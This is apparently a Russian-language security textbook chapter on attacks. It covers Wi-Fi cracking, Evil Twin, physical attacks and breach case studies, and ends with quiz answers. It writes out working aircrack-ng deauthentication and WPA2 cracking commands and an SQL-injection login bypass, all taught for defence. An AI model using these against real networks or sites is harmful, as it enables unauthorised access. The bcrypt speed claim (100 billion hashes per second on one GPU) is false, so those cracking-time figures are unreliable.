aircrack-ng capture-01.cap
# Результат: WEP-ключ найден за 2-5 минут
```

**Защита:**
- **Никогда не используй WEP** (мёртвая технология)
- Только **WPA2** или **WPA3**

---

### Взлом WPA2 (Wi-Fi Protected Access 2)

**Как работает:**
- WPA2 использует **4-way handshake** для аутентификации
- Хакер перехватывает handshake → брутфорсит пароль офлайн

**Процесс взлома:**
```bash
# 1. Перехватить handshake
airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture wlan0mon

# 2. Деаутентифицировать клиента (чтобы он переподключился и handshake повторился)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 3. Взломать пароль (brute force с wordlist)
aircrack-ng -w passwords.txt capture-01.cap
# Если пароль "password123" в словаре → взломан
```

**Сложность:**
- Если пароль сложный (`Kj8$mQ#2vL9p`) и не в словаре → взлом займёт годы
- Если пароль простой (`12345678`) → взлом за минуты

**Защита:**
- **Длинный пароль Wi-Fi** (минимум 16 символов)
- **WPA3** (защищён от offline brute force)

---

### Evil Twin (Злой двойник)

**Определение**: Создание фальшивой точки доступа с таким же именем, как у легитимной.

**Как работает:**
1. Настоящая сеть: `Starbucks_WiFi` (пароля нет)
2. Хакер создаёт точку: `Starbucks_WiFi` (с более сильным сигналом)
3. Жертвы автоматически подключаются к хакеру
4. Хакер перенаправляет трафик через себя (MITM) → перехватывает логины/пароли

**Инструмент — WiFi Pineapple**:
- Девайс для тестирования безопасности Wi-Fi
- Автоматически создаёт Evil Twin и перехватывает трафик

**Защита:**
- **Не подключайся к открытым Wi-Fi** без VPN
- Проверяй имя сети (если видишь две `Starbucks_WiFi` — подозрительно)
- Используй VPN всегда в публичных сетях

---

## 9.5.7. Физический доступ: Когда хакер — это уборщица

---

### USB Drop Attack (Подбрасывание USB)

**Определение**: Оставление заражённых USB-флешек в местах, где их могут подобрать.

**Реальный эксперимент — University of Illinois (2016)**:
- Исследователи разбросали **297 USB-флешек** по кампусу
- **48%** флешек подняли и вставили в компьютер
- Если бы флешки были заражены → 48% компьютеров скомпрометированы

**Защита:**
- **Не вставляй чужие USB**
- Отключи автозапуск: `Панель управления → Автозапуск → Снять все галочки`

---

### Shoulder Surfing (Подглядывание через плечо)

**Определение**: Наблюдение за экраном или клавиатурой жертвы.

**Где используется:**
- В кафе (подсмотреть пароль)
- В аэропорту (PIN-код карты)
- В банкомате (прикрыть клавиатуру рукой!)

**Защита:**
- **Privacy screen** (плёнка на экран, ограничивающая угол обзора)
- Не вводи пароли в публичных местах
- Прикрывай клавиатуру рукой при вводе PIN

---

### Кража устройств

**Пример — ноутбук без шифрования:**
- Украли ноутбук из машины
- Вытащили жёсткий диск
- Подключили к другому компьютеру
- Прочитали все файлы (документы, пароли из браузера)

**Защита:**
- **Шифрование диска** (BitLocker, LUKS, FileVault) — [Глава 9.04](09_04_противодействие_нарушениям.md)
- **Удалённое стирание** (Find My Device)

---

## 9.5.8. Реальные кейсы: Когда всё пошло не так

---

### Target (2013) — 40 миллионов карт украдено через HVAC

**Что произошло:**
- Хакеры взломали **подрядчика** (компанию, обслуживающую кондиционеры Target)
- Получили учётные данные для VPN Target
- Проникли в сеть Target → установили вредоносное ПО на кассовые терминалы
- Украдено **40 млн номеров кредитных карт** и **70 млн личных данных**

**Ущерб:**
- $162 млн компенсаций
- Увольнение CEO
- Репутационные потери

**Урок:** Защищай **цепочку поставок** (подрядчики = слабое звено).

---

### Sony Pictures (2014) — Месть за фильм

**Что произошло:**
- Группа **Guardians of Peace** (предположительно Северная Корея) взломала Sony
- Причина: фильм «The Interview» (комедия про убийство Ким Чен Ына)
- Украдено: email топ-менеджеров, нереализованные фильмы, зарплаты актёров, данные сотрудников

**Ущерб:**
- $15 млн на восстановление
- Публичный позор (утечка неполиткорректных email)

**Урок:** Политические хакеры существуют (не только финансовая мотивация).

---

### SolarWinds (2020) — Атака на цепочку поставок

**Что произошло:**
- Хакеры (предположительно российская группа **APT29 / Cozy Bear**) взломали компанию **SolarWinds** (разработчик ПО для мониторинга IT-инфраструктуры)
- Внедрили бэкдор в обновление программы **Orion**
- 18,000 организаций установили заражённое обновление
- Скомпрометированы: Microsoft, FireEye, министерства США

**Ущерб:**
- Неизвестен (государственная тайна)
- Считается одной из самых сложных кибератак в истории

**Урок:** Даже обновления ПО могут быть заражены (проверяй цифровые подписи).

---

## 9.5.9. Ключевые термины

- **Социальная инженерия** — манипуляция людьми для выманивания информации
- **Фишинг** — поддельные письма/сайты для кражи учётных данных
- **Spear Phishing** — целевой фишинг на конкретного человека
- **Whaling** — фишинг на топ-менеджеров
- **Pretexting** — создание ложного сценария для обмана жертвы
- **Baiting** — атака, основанная на любопытстве (USB drop, fake Wi-Fi)
- **Quid Pro Quo** — обещание выгоды в обмен на информацию
- **Brute Force** — перебор всех возможных паролей
- **Dictionary Attack** — перебор популярных паролей из словаря
- **Rainbow Table** — предвычисленные хеши паролей
- **Credential Stuffing** — использование украденных паролей с одного сайта на других
- **MITM (Man-in-the-Middle)** — перехват трафика между клиентом и сервером
- **Packet Sniffing** — прослушивание трафика в сети
- **IP Spoofing** — подделка IP-адреса отправителя
- **DDoS** — атака отказа в обслуживании (перегрузка сервера)
- **DNS Spoofing** — подмена DNS-записи (перенаправление на фальшивый сайт)
- **SQL Injection** — внедрение вредоносного SQL-кода
- **XSS (Cross-Site Scripting)** — внедрение JavaScript на сайт
- **CSRF** — подделка запросов от имени жертвы
- **RCE (Remote Code Execution)** — удалённое выполнение кода на сервере
- **Вирус** — программа, копирующая себя в другие файлы
- **Червь** — самораспространяющаяся программа
- **Троян** — вредоносная программа, маскирующаяся под легитимную
- **Ransomware** — вирус, шифрующий файлы и требующий выкуп
- **Spyware** — шпионское ПО
- **Rootkit** — ПО, скрывающее своё присутствие в системе
- **Evil Twin** — фальшивая точка доступа Wi-Fi
- **Shoulder Surfing** — подглядывание за экраном/клавиатурой

---

## 9.5.10. Контрольные вопросы

### Теория

1. **Чем отличается фишинг от spear phishing?**
   - Фишинг — массовая рассылка, spear phishing — целевая атака на конкретного человека с персонализированным контентом.

2. **Почему rainbow table бесполезна, если пароли хранятся с солью?**
   - Соль — случайная строка, добавляемая к паролю перед хешированием. Даже одинаковые пароли имеют разные хеши → для каждого пользователя нужна своя rainbow table.

3. **Как работает MITM-атака в публичном Wi-Fi?**
   - Хакер выполняет ARP spoofing (обманывает роутер, что его MAC-адрес = адрес роутера) → весь трафик идёт через хакера → он может подслушивать и модифицировать данные.

4. **Чем SQL-инъекция опасна и как защититься?**
   - Позволяет выполнить произвольный SQL-код (украсть данные, удалить таблицы). Защита: prepared statements, ORM, валидация ввода.

5. **Почему ransomware так эффективен?**
   - Шифрует файлы AES-256 (невозможно расшифровать без ключа), создаёт срочность (72 часа), требует выкуп в биткоинах (анонимность).

6. **Что такое Evil Twin и как защититься?**
   - Фальшивая точка доступа с именем легитимной сети. Защита: VPN в публичных Wi-Fi, проверка сертификатов HTTPS, отключение автоподключения к Wi-Fi.

7. **Почему WEP устарел?**
   - Использует слабое шифрование RC4, взламывается за 5 минут с помощью aircrack-ng. Нужно использовать WPA2/WPA3.

8. **Чем вирус отличается от червя?**
   - Вирус заражает файлы (нужен носитель), червь — самостоятельно распространяется по сети.

9. **Что такое rootkit и почему его сложно обнаружить?**
   - Вредоносное ПО, скрывающее своё присутствие (заменяет системные утилиты). Kernel-mode rootkit работает на уровне ядра → антивирусы не видят.

10. **Как работает credential stuffing?**
    - Использование украденных email/password с одного сайта на других. 53% пользователей используют один пароль везде → миллионы аккаунтов скомпрометированы.

---

### Практические задачи

**Задача 1 — Распознавание фишинга**:

Ты получил email:
```
От: security@paypa1.com
Тема: СРОЧНО! Ваш аккаунт заблокирован!

Обнаружена подозрительная активность. 
Подтвердите личность в течение 24 часов, иначе аккаунт будет удалён.

[Кликните здесь для подтверждения]
```

**Вопрос:** Какие признаки фишинга ты видишь?

<details>
<summary>Ответ</summary>

1. **Подозрительный домен**: `paypa1.com` (единица вместо L) вместо `paypal.com`
2. **Срочность**: «24 часа, иначе...» (паника)
3. **Страх**: «аккаунт будет удалён»
4. **Общее обращение** (нет имени)
5. **Подозрительная ссылка** (наведи мышь → увидишь реальный URL)

**Действия:**
- Не кликай на ссылку
- Перейди на paypal.com вручную (набери в браузере)
- Проверь аккаунт там
- Сообщи о фишинге: `phishing@paypal.com`
</details>

---

**Задача 2 — SQL-инъекция**:

Веб-форма входа:
```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

**Вопрос:** Какой ввод позволит войти без пароля?

<details>
<summary>Ответ</summary>

```
username: admin' OR '1'='1' --
password: (любой)

SQL: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
```

- `OR '1'='1'` — всегда истина
- `--` — комментарий (всё после игнорируется)
- Результат: вход без проверки пароля

**Защита:**
```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```
</details>

---

**Задача 3 — Взлом WPA2**:

У тебя есть handshake от Wi-Fi сети. Пароль: `MyWiFi2023`.

**Вопрос:** Сколько времени займёт взлом, если:
- Словарь из 10 млн паролей, скорость проверки 1000 паролей/сек?
- Словарь из 1 млрд паролей, скорость 100,000 паролей/сек?

<details>
<summary>Ответ</summary>

1. **10 млн паролей, 1000 п/сек:**
   ```
   Время = 10,000,000 / 1000 = 10,000 секунд = 2.8 часа
   ```

2. **1 млрд паролей, 100,000 п/сек:**
   ```
   Время = 1,000,000,000 / 100,000 = 10,000 секунд = 2.8 часа
   ```

**Вывод:** Если пароль `MyWiFi2023` в словаре → взломан за часы. Если пароля нет в словаре → brute force займёт годы.

**Защита:** Используй длинный пароль (16+ символов): `My-Super-Secure-WiFi-Password-2023!`
</details>

---

**Задача 4 — DDoS-атака**:

Твой сайт получает **100,000 запросов/сек**. Сервер обрабатывает **1000 запросов/сек**.

**Вопрос:**
1. Сколько процентов запросов будет обработано?
2. Какие методы защиты помогут?

<details>
<summary>Ответ</summary>

1. **Процент обработанных запросов:**
   ```
   Обработано = 1000 / 100,000 = 1%
   99% запросов отброшены → сайт недоступен
   ```

2. **Методы защиты:**
   - **CDN (Cloudflare, Akamai)** — распределит трафик по дата-центрам
   - **Rate limiting** — блокировать IP после 100 запросов/сек
   - **WAF** — фильтровать подозрительные запросы
   - **Anycast** — один IP → несколько серверов по миру
   - **Увеличение мощности** (вертикальное/горизонтальное масштабирование)
</details>

---

**Задача 5 — Расчёт времени взлома пароля**:

GPU RTX 4090 проверяет **100 миллиардов хешей/сек** (bcrypt).

Пароли:
1. `12345678` (8 цифр)
2. `Password1` (9 символов, буквы + цифра)
3. `P@ssw0rd!2023` (13 символов, буквы + цифры + спецсимволы)

**Вопрос:** Сколько времени займёт brute force каждого пароля?

<details>
<summary>Ответ</summary>

**Параметры:**
- Цифры: 10 символов
- Буквы (a-z, A-Z): 52 символа
- Буквы + цифры: 62 символа
- Буквы + цифры + спецсимволы: 95 символов
- Скорость: 100 млрд/сек

**Расчёты:**

1. **`12345678` (8 цифр):**
   ```
   Комбинаций = 10^8 = 100,000,000
   Время = 100,000,000 / 100,000,000,000 = 0.001 сек
   ```
   **Мгновенно взломан.**

2. **`Password1` (9 символов, буквы + цифра):**
   ```
   Комбинаций = 62^9 = 1.35 × 10^16
   Время = 1.35 × 10^16 / 10^11 = 135,000 сек = 37.5 часов
   ```
   **Взломан за 1.5 дня.**

3. **`P@ssw0rd!2023` (13 символов, буквы + цифры + спецсимволы):**
   ```
   Комбинаций = 95^13 = 5.9 × 10^25
   Время = 5.9 × 10^25 / 10^11 = 5.9 × 10^14 сек = 18.7 млн лет
   ```
   **Практически невзламываем.**

**Вывод:**
- 8 символов = небезопасно
- 9 символов = взломают за дни
- 13+ символов = безопасно (пока не изобретут квантовые компьютеры)
</details>

---

## Заключение: Атака — это искусство находить слабое звено

Мы разобрали десятки способов атак: от примитивного фишинга до сложнейших supply chain attacks (SolarWinds). Но **общая идея одна:**

> Хакеры не ломают шифрование. Они ломают людей, процессы и слабые места в системе.

**Закон Шнайера**: *Безопасность — это цепь. Она ломается в самом слабом звене.*

**Что делать?**
1. **Обучай персонал** — 82% атак начинаются с человеческого фактора
2. **Обновляй ПО** — большинство взломов используют известные уязвимости
3. **Используй MFA** — даже если пароль украден, нужен второй фактор
4. **Шифруй всё** — данные в покое и в движении
5. **Мониторь** — SIEM, логи, алерты
6. **Резервируй** — backup спасёт от ransomware
7. **Тестируй** — penetration testing, red team exercises

**Следующая глава:** 9.06 — Методы реализации угроз (технические детали атак: как работает buffer overflow, ROP, heap spray, format string, race condition и т.д.).

---

**Связанные главы:**
- **9.03 (Угрозы ИБ)** — классификация угроз
- **9.04 (Противодействие)** — защита от атак
- **9.06 (Методы реализации угроз)** — технические детали
- **9.02 (Криптография)** — атаки на шифрование
- **8.04 (Протоколы Internet)** — сетевые атаки


---

[← К оглавлению](README.md)

*Глава 9.5: . Способы нарушения конфиденциальности. Атаки*
